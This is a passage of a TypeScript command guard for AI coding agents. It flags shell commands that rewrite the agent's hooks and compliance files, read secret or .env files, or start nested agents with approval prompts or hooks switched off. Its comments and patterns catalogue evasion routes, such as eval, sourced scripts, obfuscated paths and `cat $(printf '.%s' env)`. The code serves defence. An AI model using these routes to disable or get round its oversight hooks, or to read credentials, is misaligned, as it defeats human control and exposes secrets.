): Cwd {
  if (prog === "popd") return null;
  if (prog !== "cd" && prog !== "pushd") return cwd;
  if (cdpath || (prog === "pushd" && (args.length !== 1 || /^[-+]/.test(args[0] ?? ""))))
    return null;
  const target = cdTarget(args);
  if (target === "-") return null;
  const dir = resolvePath(target, cwd, ctx, true);
  return dir !== null && dir.length > MAX_CWD_CHARS ? null : dir;
}

/** Programs that run a script in THIS shell, which may `cd` anywhere. */
const SOURCES = /^(source|\.)$/;
/** A construct the guard does not parse (a loop, a `case`, a function definition) that holds a directory change. */
const COMPOUND_START =
  /^\s*(case|for|while|until|select|function)\b|^\s*[A-Za-z_][\w.-]*\s*\(\s*\)/;
const MENTIONS_CD = /\b(cd|pushd|popd)\b/;

/**
 * Can this command change the directory of the shell around it without the guard seeing a `cd` it models? A
 * script it sources, an `eval` of text that names a `cd` or that is built at run time, and a function or `case`
 * whose body holds one. The directory is then unknown, and a relative write from it asks.
 */
function hidesDirectoryChange(p: Parsed, text: string): boolean {
  if (SOURCES.test(p.prog)) return true;
  if (p.prog === "eval") {
    const body = p.args.join(" ");
    return MENTIONS_CD.test(body) || /[$`]/.test(body);
  }
  return COMPOUND_START.test(text) && MENTIONS_CD.test(text);
}

/** {@link nextDir} for each possible directory; undefined when the command does not move at all. */
function nextDirs(
  dirs: readonly Cwd[],
  p: Parsed,
  text: string,
  ctx: BashContext,
  cdpath: boolean,
): readonly Cwd[] | undefined {
  if (p.prog === "cd" || p.prog === "pushd" || p.prog === "popd") {
    return capDirs([...new Set(dirs.map((dir) => nextDir(dir, p.prog, p.args, ctx, cdpath)))]);
  }
  return hidesDirectoryChange(p, text) ? [null] : undefined;
}

/** Where `env -C DIR cmd` and `sudo -D DIR cmd` run `cmd`: DIR, from each directory the command may be in. */
const runIn = (dirs: readonly Cwd[], target: string, ctx: BashContext): readonly Cwd[] =>
  capDirs([...new Set(dirs.map((dir) => nextDir(dir, "cd", [target], ctx, false)))]);

/** Representative protected files, lower-case: a directory that holds one of them is an ancestor. */
const PROTECTED_SAMPLES: readonly string[] = [
  ".claude/settings.json",
  ".claude/settings.local.json",
  ".claude/rules/x",
  ".claude/agents/x",
  ".claude/skills/x",
  ".claude/audit/x",
  ".claude/.cache/x",
  ".agents/rules/x",
  ".agents/agents/x",
  ".agents/skills/x",
  ".agents/plugins/x",
  ".codex/hooks.json",
  ".codex/config.toml",
  ".codex/hooks/x",
  ".codex/rules/x",
  "scripts/harness/x",
  "scripts/check-compliance-controls.ts",
  "compliance/x",
  ".githooks/x",
  ".github/codeowners",
  ".github/workflows/x",
  "deploy/production/x",
  ".trivyignore.yaml",
  "agents.md",
  "claude.md",
  "~/.codex/hooks.json",
  "~/.codex/config.toml",
  "~/.claude/settings.json",
  "~/.claude/settings.local.json",
  "~/.bunfig.toml",
];

/** What one command writes to. `anc`: a directory that CONTAINS a protected path counts; `merge`: the repo root does too. */
interface WriteTarget {
  readonly raw: string;
  readonly anc: boolean;
  readonly merge: boolean;
}
const wt = (raw: string, anc = false, merge = false): WriteTarget => ({ raw, anc, merge });

function protectedTouch(rel: string, t: WriteTarget): boolean {
  if (PROTECTED_PATH.test(rel)) return true;
  if (!t.anc) return false;
  const dir = trimSlashes(rel).toLowerCase();
  return dir === "" ? t.merge : PROTECTED_SAMPLES.some((s) => s.startsWith(`${dir}/`));
}

const baseName = (p: string): string => p.replace(/\/+\.?$/, "").replace(/^.*\//, "");
/** `src/.`, `src/` and `.` copy a directory's CONTENTS onto the destination. */
const isContentsSource = (s: string): boolean => /(^|\/)\.?$/.test(s);

const SHORT_FLAGS = /^-[A-Za-z]+$/;
/**
 * Is `arg` a short-flag cluster (`-rf`) holding one of `letters`? Two `[A-Za-z]*` around the letter backtrack
 * quadratically on a long word, and the hook fails OPEN at its timeout, so this is one anchored test and a scan.
 */
function clusterHas(arg: string, letters: string, cluster: RegExp = SHORT_FLAGS): boolean {
  if (!cluster.test(arg)) return false;
  for (const letter of letters) if (arg.includes(letter)) return true;
  return false;
}
/** GNU getopt takes any unambiguous prefix of a long option (`--rec`); `minChars` is the fewest after `--` that is one. */
const isLongOption = (arg: string, name: string, minChars: number): boolean =>
  arg.startsWith("--") && arg.length - 2 >= minChars && name.startsWith(arg.slice(2));
const isRecursive = (arg: string): boolean =>
  clusterHas(arg, "rRa") || isLongOption(arg, "recursive", 3) || isLongOption(arg, "archive", 3);
const RG_SHORT_FLAGS = /^-[A-Za-z.]+$/;
/** `-ec`, `-xc`: a short cluster with `c` after its first letter (a bare `-c` is matched on its own). */
const isShortClusterWithC = (arg: string): boolean =>
  arg.startsWith("-") && !arg.includes("-", 1) && arg.indexOf("c", 2) >= 2;
/** GNU getopt takes any unambiguous prefix of a long option, and `--in-place` is the only sed option that starts `--i`. */
function isLongInPlace(arg: string): boolean {
  if (!arg.startsWith("--i")) return false;
  const eq = arg.indexOf("=");
  return "in-place".startsWith(arg.slice(2, eq < 0 ? undefined : eq));
}
/** `sed -i`, `-ni`, `-i.bak`, `--in-place`, `--in-p`: edits its files where they are. */
const isInPlace = (arg: string): boolean =>
  (/^-([A-Za-z]*)/.exec(arg)?.[1] ?? "").includes("i") || isLongInPlace(arg);

/**
 * Destination and sources of cp/mv/ln/install/rsync, honouring `-t DIR`, `-tDIR`, `-at DIR` and `--target-directory=DIR`
 * (GNU takes any prefix of the long name: `--target=DIR`). rsync's `-t` is `--times`, not a destination.
 */
function splitDest(
  args: readonly string[],
  files: readonly string[],
  targetOption = true,
): { dest: string | undefined; srcs: string[] } {
  const dest = targetOption ? optionValues(args, "t", [["target-directory", 1]])[0] : undefined;
  if (dest !== undefined) return { dest, srcs: files.filter((f) => f !== dest) };
  return { dest: files.at(-1), srcs: files.slice(0, -1) };
}

/** The destination, and `dest/<name>` for each source: `cp x scripts/` writes `scripts/x`. */
function copyTargets(
  args: readonly string[],
  files: readonly string[],
  recursive: boolean,
  targetOption = true,
): WriteTarget[] {
  const { dest, srcs } = splitDest(args, files, targetOption);
  if (dest === undefined) return [];
  const contents = recursive || srcs.some(isContentsSource);
  return [wt(dest, contents, contents), ...srcs.map((s) => wt(`${dest}/${baseName(s)}`))];
}

/** Does an `-exec` command (its words, wrappers and all) write the files it is handed? */
function execWritesWords(words: readonly string[]): boolean {
  const { prog, args } = parseSegment(words.map(shellQuote).join(" "));
  return execCommandWrites(prog, args, isInPlace);
}

/**
 * `find <start…> -delete` and `find <start…> -exec rm {} +` write to everything under the start paths. Over
 * the repo root that is the whole tree, harness and compliance record included, unless a name or path test
 * limits it (`find . -name '*.tmp' -delete` stays an everyday cleanup).
 */
function findWrites(args: readonly string[]): WriteTarget[] {
  // `-fprint F`, `-fprint0 F`, `-fprintf F FORMAT` and `-fls F` write the file F.
  const printed = targetsOf(
    args.flatMap((a, i) =>
      /^-f(?:print0?|printf|ls)$/.test(a) && args[i + 1] !== undefined
        ? [args[i + 1] as string]
        : [],
    ),
  );
  let k = 0;
  while (/^-[HLP]$/.test(args[k] ?? "")) k++;
  const starts: string[] = [];
  for (; k < args.length && !/^(-|\\?\(|!)/.test(args[k] ?? ""); k++) starts.push(args[k] ?? "");
  const rest = args.slice(k);
  const actions = findActions(rest, execWritesWords);
  if (actions.length === 0) return printed;
  const wholeTree = actions.some((a) => !a.narrowed);
  return [
    ...printed,
    ...fileArgs(starts.length > 0 ? starts : ["."]).map((s) => wt(s, true, wholeTree)),
  ];
}

/** The tar family: GNU tar installed as `gtar`, and `bsdtar` (macOS's own). */
const TAR = /^(?:tar|gtar|gnutar|bsdtar)$/;
/** Programs that unpack an archive into a directory: `tar x`, `unzip`, `7z x`, `cpio -i`. */
const UNPACKER = /^(?:tar|gtar|gnutar|bsdtar|unzip|7z[a-z]?|cpio)$/;

/** `tar x…`, `unzip`, `7z x` and `cpio -i` unpack into `-C dir` / `-d dir` / `-oDIR`, or the current directory: a merge into it. */
function unpackWrites(prog: string, args: readonly string[]): WriteTarget[] {
  const flagValue = (short: string, long: string): string | undefined => {
    const k = args.indexOf(short);
    const eq = args.find((a) => a.startsWith(`${long}=`))?.slice(long.length + 1);
    return eq ?? (k >= 0 ? args[k + 1] : undefined);
  };
  if (prog === "unzip") {
    const listing = args.some((a) => clusterHas(a, "ltZpv"));
    return listing ? [] : [wt(flagValue("-d", "--directory") ?? ".", true, true)];
  }
  if (/^7z[a-z]?$/.test(prog)) {
    // `7z x a.7z -oDIR`: the command word comes first, and `-o` carries its directory with no space.
    if (!/^[xe]$/.test(args[0] ?? "")) return [];
    return [wt(args.find((a) => a.startsWith("-o"))?.slice(2) || ".", true, true)];
  }
  if (prog === "cpio") {
    const extracting = args.some(
      (a) => a === "--extract" || (/^-[A-Za-z]+$/.test(a) && a.includes("i")),
    );
    return extracting ? [wt(flagValue("-D", "--directory") ?? ".", true, true)] : [];
  }
  const extract = args.some(
    (a, i) =>
      /^--(extract|get)$/.test(a) ||
      (/^-?[A-Za-z]+$/.test(a) && (i === 0 || a.startsWith("-")) && a.includes("x")),
  );
  return extract ? [wt(flagValue("-C", "--directory") ?? ".", true, true)] : [];
}

/**
 * Programs that write the file an option names: `wget -O`/`-o`/`-a`/`-P`, `sort -o`, `base64 -o`, each with its
 * short letter and its long spelling (`curl` is {@link curlWrites}). wget's `--output-document` and `--output-file`
 * share `--output-`, so those are ambiguous until the last letter.
 */
const OUTPUT_OPTIONS: ReadonlyMap<
  string,
  ReadonlyArray<readonly [string, readonly LongOption[]]>
> = new Map([
  [
    "wget",
    [
      ["O", [["output-document", 8]]],
      ["o", [["output-file", 8]]],
      ["a", [["append-output", 2]]],
      // The directory a download is saved in; `--dir` is ambiguous with `--directories`, `--directory` is not.
      ["P", [["directory-prefix", 9]]],
    ],
  ],
  ["sort", [["o", [["output", 1]]]]],
  ["base64", [["o", [["output", 1]]]]],
]);

/** The write targets named by words, brace-expanded and unescaped as the shell would. */
const targetsOf = (words: readonly string[]): WriteTarget[] => fileArgs(words).map((f) => wt(f));

/**
 * What `curl` writes: the `-o`/`--output` file, and, with `--output-dir DIR`, the directory a relative `-o` file or
 * a `-O` name lands in. `-O` alone writes the URL's name into the current directory (`.`). With no `-o` and no `-O`
 * curl writes to stdout, and `--output-dir` alone writes nothing. curl takes no abbreviated long options.
 */
function curlWrites(args: readonly string[]): WriteTarget[] {
  const files = optionValues(args, "o", [["output", 6]]);
  const dirs = optionValues(args, "", [["output-dir", 10]]);
  const remoteName = args.some(
    (a) => a === "--remote-name" || a === "--remote-name-all" || clusterHas(a, "O"),
  );
  if (files.length === 0 && !remoteName) return [];
  const into = dirs.length > 0 ? dirs : remoteName ? ["."] : [];
  return targetsOf([...files, ...into]);
}

/**
 * The files a `sed` script writes: the `w FILE` command (`sed -n 'w out'`, `1,3w out`) and the `w` flag of `s///w
 * out`. The file name runs to the end of the line, so the whole rest of the line and its first word are both
 * named. Read as text: the `w` might be a letter inside a pattern, and that costs nothing unless what follows it
 * resolves onto a protected path.
 */
function sedWriteTargets(args: readonly string[]): WriteTarget[] {
  const names: string[] = [];
  for (const arg of args) {
    const script = arg.startsWith("--expression=")
      ? arg.slice("--expression=".length)
      : /^-[A-Za-z]*e./.test(arg)
        ? arg.slice(arg.indexOf("e") + 1)
        : arg.startsWith("-")
          ? ""
          : arg;
    for (const m of script.matchAll(/(?<![A-Za-z_])[wW][ \t]*([^\n]+)/g)) {
      const rest = (m[1] ?? "").trim();
      names.push(rest, rest.split(/[\s;}]/)[0] ?? "");
    }
  }
  return targetsOf(names);
}

/** Compressors that replace their input with the compressed (or decompressed) file unless told to print it. */
const COMPRESSOR =
  /^(gzip|gunzip|bzip2|bunzip2|xz|unxz|lzma|unlzma|zstd|unzstd|compress|uncompress)$/;
const COMPRESSED_SUFFIX = /\.(gz|bz2|xz|lzma|zst|Z)$/;
const COMPRESSOR_READ_ONLY = new Set(["--stdout", "--to-stdout", "--test", "--list"]);

function compressorWrites(args: readonly string[], files: readonly string[]): WriteTarget[] {
  if (args.some((a) => COMPRESSOR_READ_ONLY.has(a) || clusterHas(a, "ctl"))) return [];
  // `gunzip x.gz` writes `x`: name both, since a protected FILE is matched by its exact name.
  return files.flatMap((f) => [wt(f), wt(f.replace(COMPRESSED_SUFFIX, ""))]);
}

/** Every path one simple command writes, deletes, moves or re-modes (redirections are added by the caller). */
function commandWrites(prog: string, args: readonly string[]): WriteTarget[] {
  return [...mainWrites(prog, args), ...targetsOf(extraOutputFiles(prog, args))];
}

function mainWrites(prog: string, args: readonly string[]): WriteTarget[] {
  const files = fileArgs(args);
  const recursive = args.some(isRecursive);
  if (prog === "rm") {
    const tree = args.some((a) => clusterHas(a, "rR") || isLongOption(a, "recursive", 1));
    return files.map((f) => wt(f, true, tree));
  }
  if (/^(unlink|shred|rmdir)$/.test(prog)) return files.map((f) => wt(f, true));
  if (prog === "mv") {
    return [
      // Moving the root, or a directory the root is in, takes everything under it away.
      ...splitDest(args, files).srcs.map((s) => wt(s, true, true)),
      ...copyTargets(args, files, false),
    ];
  }
  if (/^(cp|install|ln)$/.test(prog)) return copyTargets(args, files, recursive);
  if (prog === "ditto") return copyTargets(args, files, true);
  // rsync and scp name a remote side `host:path`; one that names this machine is a local path.
  if (/^(rsync|scp)$/.test(prog)) return copyTargets(args, files.map(localPath), true, false);
  if (/^(tee|touch|truncate|mkdir|ed|ex|vi|vim|nano)$/.test(prog)) return files.map((f) => wt(f));
  if (/^(chmod|chown|chgrp|setfacl|chflags|xattr)$/.test(prog)) {
    return files.map((f) => wt(f, recursive, recursive));
  }
  if (/^(sed|perl)$/.test(prog)) {
    const inPlace = args.some(isInPlace) ? files.map((f) => wt(f)) : [];
    return prog === "sed" ? [...inPlace, ...sedWriteTargets(args)] : inPlace;
  }
  if (prog === "curl") return curlWrites(args);
  if (prog === "dd") return args.filter((a) => a.startsWith("of=")).map((a) => wt(a.slice(3)));
  const outputOptions = OUTPUT_OPTIONS.get(prog);
  if (outputOptions) {
    return outputOptions
      .flatMap(([short, long]) => optionValues(args, short, long))
      .map((f) => wt(f));
  }
  if (prog === "openssl") {
    return args.flatMap((a, k) =>
      (a === "-out" || a === "-keyout") && args[k + 1] ? [wt(args[k + 1] as string)] : [],
    );
  }
  if (COMPRESSOR.test(prog)) return compressorWrites(args, files);
  if (prog === "find") return findWrites(args);
  return UNPACKER.test(prog) ? unpackWrites(prog, args) : [];
}

interface WriteHit {
  /** The protected path (repo-relative) the command lands on; null when it is the unknown directory. */
  readonly path: string | null;
}

/** A protected path quoted inside an inline-code argument, e.g. `open('.claude/settings.json','w')`. */
function findProtectedIn(arg: string, dirs: readonly Cwd[], ctx: BashContext): string | null {
  for (const m of arg.matchAll(/['"]([^'"\s]+)['"]/g)) {
    for (const dir of dirs) {
      const rel = resolvePath(m[1] ?? "", dir, ctx);
      if (rel !== null && PROTECTED_PATH.test(rel)) return rel;
    }
  }
  return null;
}

/** Does this command write onto the guard, ledger, rules or compliance record, from any directory it may run in? */
function writesProtectedPath(p: Parsed, dirs: readonly Cwd[], ctx: BashContext): WriteHit | null {
  const inline = runsInlineCode(p.prog, p.args);
  const targets: WriteTarget[] = [
    ...p.outs.flatMap(expandBraces).map((raw) => wt(raw)),
    ...commandWrites(p.prog, p.args),
    ...(inline && mayWriteFileOperands(p.prog, p.args)
      ? fileArgs(p.args).map((raw) => wt(raw))
      : []),
  ];
  let unknownDir = false;
  for (const t of targets) {
    if (work.spent) return { path: null };
    for (const dir of dirs) {
      const rel = resolvePath(t.raw, dir, ctx);
      if (rel === null) unknownDir = true;
      else if (protectedTouch(rel, t) || isToolchainPath(rel)) return { path: rel };
      else if (t.merge && isRootAncestor(rel, ctx)) return { path: "" };
    }
  }
  if (inline) {
    for (const t of fileArgs(p.args)) {
      const found = findProtectedIn(t, dirs, ctx);
      if (found) return { path: found };
    }
  }
  return unknownDir ? { path: null } : null;
}

// ---------------------------------------------------------------------------------------------------
// Scripts the guard can only read as text
// ---------------------------------------------------------------------------------------------------

/** Quotes, `+`, backslashes and whitespace removed: `'scripts/'+'harness/x'` reads as `scripts/harness/x`. */
const squash = (s: string): string => s.replace(/['"`+\\\s]/g, "");
// A protected path as it reads once squashed. Directories anchored at the repo root must not be preceded
// by a path component (`docs/compliance/` is a docs page); settings and hook files count at any depth.
const PROTECTED_FRAGMENT = new RegExp(
  [
    String.raw`(?<![A-Za-z0-9_.-])(?<![A-Za-z0-9_-]\/)(?:\.claude\/(?:audit|\.cache|rules|agents|skills)|\.agents\/(?:rules|agents|skills|plugins)|scripts\/harness|compliance\/|\.githooks|\.github\/workflows|deploy\/production|\.gitleaks\.toml|\.trivyignore\.yaml|agents\.md|claude\.md|scripts\/check-compliance-controls|\.github\/codeowners)`,
    String.raw`(?<![A-Za-z0-9_-])(?:\.claude\/settings(?:\.local)?\.json|\.codex\/(?:hooks|config\.toml|rules)|\.?bunfig\.toml|agents\.override\.md)`,
  ].join("|"),
  "i",
);

/** A script (inline `-c` code, or a heredoc/stdin body) naming a secret file (deny) or a protected one (ask). */
function scriptTextVerdict(text: string): BashVerdict | null {
  const flat = squash(text);
  if (SECRET_MENTION.test(text) || SECRET_MENTION.test(flat)) {
    return deny(
      "Inline code that opens a live secret file is the same read as `cat`. Agents do not read secrets or dumps.",
    );
  }
  // Tested as written too: squashing puts the word before a path against it (`rm scripts/harness` reads
  // `rmscripts/harness`), and the fragment's lookbehind then takes that word for a parent directory.
  if (environmentLeak(text) !== null) {
    return deny(
      "Inline code that reads the whole environment, or a secret variable by name, puts credentials into the transcript. Check presence, not the value.",
    );
  }
  if (PROTECTED_FRAGMENT.test(text) || PROTECTED_FRAGMENT.test(flat)) {
    return ask(
      "Script text the guard can only read as a string names the agent harness or the compliance record. Changing those through a script skips the edit prompt, so a human approves it here.",
    );
  }
  return null;
}

// ---------------------------------------------------------------------------------------------------
// git writers, nested agents, indirect secret reads
// ---------------------------------------------------------------------------------------------------

const UNKNOWN_DIR_REASON =
  "A `cd` the guard cannot resolve comes before this write, so it could land in the agent harness or the compliance record. A human approves it here.";
const protectedReason = (path: string): string =>
  isToolchainPath(path)
    ? `\`${echo(path)}\` is the bun the agent hooks run on, or a shell startup file: a write there switches the guard off for every later command. A human approves it here.`
    : `\`${echo(path)}\` is part of the agent harness or the compliance record. Changing it through the shell skips the edit prompt, so a human approves it here.`;
const WHOLE_TREE: WriteTarget = { raw: "", anc: true, merge: true };
const ROOT_WIDE_REASON =
  "This recursive delete, permission change or tree merge takes in the whole repo root, and with it the agent harness and the compliance record. A human decides.";

/** Pathspecs a `git checkout|restore|rm|mv` writes, by the git rules for each (`--`, `--source X`, `-b`). */
function gitPathspecs(sub: string, rest: readonly string[], ctx: BashContext, dir: Cwd): string[] {
  const dashdash = rest.indexOf("--");
  if (dashdash >= 0) return rest.slice(dashdash + 1);
  const valueFlag =
    sub === "restore"
      ? /^(-s|--source|--pathspec-from-file)$/
      : /^(-b|-B|--orphan|--conflict|--pathspec-from-file)$/;
  const positional: string[] = [];
  let branching = false;
  for (let k = 0; k < rest.length; k++) {
    const a = rest[k] ?? "";
    if (a.startsWith("-") && sub !== "rm" && sub !== "mv" && valueFlag.test(a)) {
      branching ||= /^(-b|-B|--orphan)$/.test(a);
      k++;
    } else if (!a.startsWith("-")) positional.push(a);
  }
  if (sub !== "checkout") return positional;
  if (branching) return [];
  // `git checkout <tree-ish> <path>…`; a lone word is a path only when it exists and is protected.
  if (positional.length !== 1) return positional.slice(1);
  const one = positional[0] ?? "";
  const rel = resolvePath(one, dir, ctx);
  const isPath = rel === null || protectedTouch(rel, WHOLE_TREE);
  return isPath && (ctx.exists?.(one) ?? true) ? [one] : [];
}

/** `git format-patch -o DIR` writes its patch files into DIR. */
function formatPatchVerdict(
  rest: readonly string[],
  cwds: readonly Cwd[],
  ctx: BashContext,
): BashVerdict | null {
  const dirs = fileArgs(optionValues(rest, "o", [["output-directory", 8]]));
  for (const cwd of cwds) {
    for (const d of dirs) {
      const rel = resolvePath(d, cwd, ctx);
      if (rel === null) return ask(UNKNOWN_DIR_REASON);
      if (protectedTouch(rel, wt(d))) return ask(protectedReason(rel));
    }
  }
  return null;
}

/** `git apply`/`am` (a diff we cannot read), `clean`, and checkout/restore/rm/mv onto protected paths. */
function gitWriteVerdict(
  sub: string,
  rest: readonly string[],
  gitDirs: readonly string[],
  cwds: readonly Cwd[],
  ctx: BashContext,
): BashVerdict | null {
  if (sub === "apply" || sub === "am") {
    if (rest.some((a) => /^--(check|stat|numstat|summary)$/.test(a))) return null;
    return ask(
      `\`git ${sub}\` applies a diff the guard cannot read; it may rewrite the guard, the hooks or the compliance record. A human decides.`,
    );
  }
  if (sub === "clean") {
    if (rest.some((a) => a === "--dry-run" || clusterHas(a, "n"))) return null;
    return ask(
      "`git clean` deletes untracked files, and with -x the ignored ones too (the audit ledger, .claude/.cache). A human decides.",
    );
  }
  if (sub === "format-patch") return formatPatchVerdict(rest, cwds, ctx);
  if (!/^(checkout|restore|rm|mv)$/.test(sub)) return null;
  for (const cwd of cwds) {
    let dir = cwd;
    for (const d of gitDirs) dir = dir === null ? null : resolvePath(d, dir, ctx, true);
    for (const p of gitPathspecs(sub, rest, ctx, dir)) {
      const rel = resolvePath(p, dir, ctx);
      if (rel === null) return ask(UNKNOWN_DIR_REASON);
      if (protectedTouch(rel, WHOLE_TREE)) return ask(protectedReason(rel));
    }
  }
  return null;
}

// A coding agent started with its approval prompts, sandbox or hook configuration switched off is an agent
// the guard no longer watches.
const AGENT_BYPASS_FLAG =
  /^--(dangerously-skip-permissions|allow-dangerously-skip-permissions|dangerously-bypass-approvals-and-sandbox|yolo)$/;
const AGENT_CLI = /(^|\/)(codex|claude(-code)?)(@[\w.-]+)?$/;

function nestedAgentVerdict(
  prog: string,
  args: readonly string[],
  assigns: readonly string[],
  here: readonly Cwd[],
): BashVerdict | null {
  const switchedOff = (what: string): BashVerdict =>
    ask(
      `${what} starts a coding agent with the guard, its approval prompts or its hook configuration off. A human decides.`,
    );
  const bypass = args.find((a) => AGENT_BYPASS_FLAG.test(a));
  if (bypass) return switchedOff(`\`${echo(bypass)}\``);
  const agent = [prog, ...args.slice(0, 3)].some((w) => AGENT_CLI.test(w));
  if (!agent) return null;
  const mode = args.findIndex(
    (a) => a === "--permission-mode" || a.startsWith("--permission-mode="),
  );
  if (mode >= 0 && /bypassPermissions/.test(`${args[mode]} ${args[mode + 1] ?? ""}`)) {
    return switchedOff("`--permission-mode bypassPermissions`");
  }
  if (args.some((a, k) => /^(-c|--config)$/.test(a) && /hook/i.test(args[k + 1] ?? ""))) {
    return switchedOff("A `-c`/`--config` override of the hooks");
  }
  if (args.some((a) => /^--config=.*hook/i.test(a)))
    return switchedOff("A `--config` override of the hooks");
  if (args.some((a) => /^--(settings|setting-sources)(=|$)/.test(a))) {
    return switchedOff("`--settings`/`--setting-sources`");
  }
  if (assigns.some((a) => /^(HOME|XDG_CONFIG_HOME)=/.test(a))) {
    return switchedOff("Re-pointing `HOME`");
  }
  // `claude --bare` skips hooks; `codex --disable codex_hooks` switches them off; `-C DIR` / `--cd DIR` starts it in
  // another tree, and so does a `cd` before it: the repo's project hooks load only from the repo.
  if (args.includes("--bare")) return switchedOff("`--bare`");
  if (
    args.some((a, k) => /^--disable(?:=|$)/.test(a) && /hook/i.test(`${a} ${args[k + 1] ?? ""}`))
  ) {
    return switchedOff("`--disable` of the hooks");
  }
  if (args.some((a) => a === "-C" || a === "--cd" || a.startsWith("--cd="))) {
    return switchedOff("A different working directory (`-C`, `--cd`)");
  }
  const onlyHelp = args.every((a) => /^(-h|--help|-v|-V|--version|version|help)$/.test(a));
  if (!onlyHelp && here.some((dir) => dir === null || dir.startsWith("/") || dir.startsWith("~"))) {
    return switchedOff(
      "A nested agent started outside the repo, where the repo's hooks do not load,",
    );
  }
  return null;
}

/**
 * Does the bare word name a file in any directory the command may be running in? `cd deploy/production/tls &&
 * cat server.key` reads a key the start directory does not hold, so each candidate is asked, not only the first.
 * A directory the guard cannot resolve counts as a hit for a program that reads files: a key-looking name there
 * is not worth the doubt.
 */
function namesFileIn(
  word: string,
  dirs: readonly Cwd[],
  ctx: BashContext,
  readsFiles: boolean,
): boolean {
  if (ctx.exists?.(word)) return true;
  const root = ctx.root ? trimSlashes(ctx.root) : "";
  for (const dir of dirs) {
    if (dir === null) {
      if (readsFiles) return true;
      continue;
    }
    const rel = resolvePath(word, dir, ctx);
    if (rel === null) continue;
    const abs = rel.startsWith("/") ? rel : rel.startsWith("~") ? null : `${root}/${rel}`;
    if (abs !== null && root && (ctx.exists?.(abs) ?? false)) return true;
  }
  return false;
}

/** A host or user@host word built by an expansion: `$(echo h)`, `` `echo h` ``, `$HOST`, `${HOST}`. */
const DYNAMIC_HOST = /\$\(|`|\$\{?[A-Za-z_]/;

// A secret file named by something the guard cannot evaluate: `cat $(printf '.%s' env)`.
const FILE_READER =
  /^(cat|head|tail|less|more|sed|awk|gawk|grep|egrep|fgrep|base64|xxd|od|strings|tac|nl|bat|hexdump|cut|sort|diff)$/;
const PATTERN_FIRST = /^(grep|egrep|fgrep|sed|awk|gawk)$/;
// Short flags that take the NEXT word as a value (a count, an offset), per program: `od -c` takes none.
const VALUE_FLAGS: ReadonlyMap<string, RegExp> = new Map([
  ["head", /^-[nc]$/],
  ["tail", /^-[nc]$/],
  ["od", /^-[AjNtwS]$/],
  ["xxd", /^-[cglso]$/],
  ["strings", /^-[nte]$/],
  ["hexdump", /^-[nsef]$/],
]);
// `$( )`, backticks, and `${X:-…}`-style expansions; a plain `$VAR` or `${VAR}` is not dynamic.
const DYNAMIC_WORD = /\$\(|`|\$\{[^}]*[^A-Za-z0-9_}]/;
const DYNAMIC_PART = /\$\([^()]*\)|`[^`]*`|\$\{[^{}]*\}/g;
const MAX_MASK_PASSES = 5;

/** The word with every `$( )`, backtick pair and `${ }` taken out: what is written literally. */
function withoutExpansions(word: string): string {
  let rest = word;
  for (let i = 0; i < MAX_MASK_PASSES; i++) rest = rest.replace(DYNAMIC_PART, "");
  return rest;
}

const DYNAMIC_PROGRAM_REASON =
  "The command's name is built by a substitution or an expansion, so the guard cannot tell which program runs. Name the program. A human decides.";

/** Is the FILE NAME part of this word built by an expansion (so the guard cannot know which file it is)? */
function dynamicName(word: string): boolean {
  if (!DYNAMIC_WORD.test(word)) return false;
  let masked = word;
  for (let i = 0; i < MAX_MASK_PASSES; i++) masked = masked.replace(DYNAMIC_PART, "\0");
  return masked.slice(masked.lastIndexOf("/") + 1).includes("\0");
}

function dynamicReaderVerdict(
  prog: string,
  args: readonly string[],
  ins: readonly string[],
): BashVerdict | null {
  if (!FILE_READER.test(prog)) return null;
  const operands: string[] = [];
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    if (VALUE_FLAGS.get(prog)?.test(a)) k++;
    else if (!a.startsWith("-")) operands.push(a);
  }
  const files = PATTERN_FIRST.test(prog) ? operands.slice(1) : operands;
  const hit = [...files, ...ins].find(dynamicName);
  if (hit === undefined) return null;
  return ask(
    `\`${echo(hit)}\` is built by command substitution or an expansion the guard cannot resolve, and it could name a live secret file (.env, key material). Name the file you need.`,
  );
}

// `grep -r` ignores .gitignore, and `rg -u`/`--no-ignore`/`--hidden` stop honouring it: either, over the
// repo root, reads every live .env under it. Plain `rg` skips ignored files, so it stays allowed.
const GREP_VALUE_LETTERS = "efmABCdD";
const RG_VALUE_LETTERS = "egtTfmABCjEMrd";
const GREP_VALUE_LONG =
  /^--(regexp|file|max-count|include|exclude|exclude-dir|exclude-from|context|after-context|before-context|label|devices|directories)$/;
const RG_VALUE_LONG =
  /^--(regexp|file|glob|iglob|type|type-not|type-add|max-count|max-depth|maxdepth|threads|encoding|max-filesize|context|after-context|before-context|sort|sortr|colors|replace|path-separator|pre|pre-glob|ignore-file|engine|max-columns)$/;
const SAFE_INCLUDE =
  /\.(ts|tsx|js|jsx|mjs|cjs|json|md|mdx|sql|ya?ml|css|html|py|sh|toml|txt|rs|go)$/i;

/** The path operands of grep/rg: positionals after the pattern (or all of them when -e/-f gave it). */
function searchPaths(args: readonly string[], shortValue: string, longValue: RegExp): string[] {
  const positional: string[] = [];
  let patternFlag = false;
  let afterDashDash = false;
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    if (afterDashDash || !a.startsWith("-")) positional.push(a);
    else if (a === "--") afterDashDash = true;
    else if (/^-[A-Za-z]+$/.test(a)) {
      const last = a.slice(-1);
      if (shortValue.includes(last)) k++;
      patternFlag ||= last === "e" || last === "f";
    } else {
      patternFlag ||= /^--(regexp|file)(=|$)/.test(a);
      if (longValue.test(a)) k++;
    }
  }
  return patternFlag ? positional : positional.slice(1);
}

/** Does this repo-relative live env file exist here? Without a way to look (a unit test), none does. */
const liveEnvExists =
  (ctx: BashContext) =>
  (file: string): boolean =>
    ctx.exists?.(ctx.root ? `${trimSlashes(ctx.root)}/${file}` : file) ?? false;

const COPY_OUT_REASON =
  "Copying a directory that holds live env files puts them where the guard does not look (and `cp -r` ignores .gitignore). Copy the files you need.";

/** `cp -r deploy/production /tmp/x`, `rsync -a …`, `ditto …`: a tree with live env files in it is copied out. */
function copyOutVerdict(
  prog: string,
  args: readonly string[],
  cwd: Cwd,
  ctx: BashContext,
): BashVerdict | null {
  if (!/^(?:cp|rsync|ditto)$/.test(prog)) return null;
  if (prog !== "ditto" && !args.some(isRecursive)) return null;
  const { srcs } = splitDest(args, fileArgs(args), prog !== "rsync");
  const reaches = srcs.some((src) => {
    const rel = resolvePath(src, cwd, ctx);
    return (
      rel !== null &&
      !rel.startsWith("/") &&
      !rel.startsWith("~") &&
      (rel === "" || reachesLiveEnv(rel, liveEnvExists(ctx)))
    );
  });
  return reaches ? ask(COPY_OUT_REASON) : null;
}

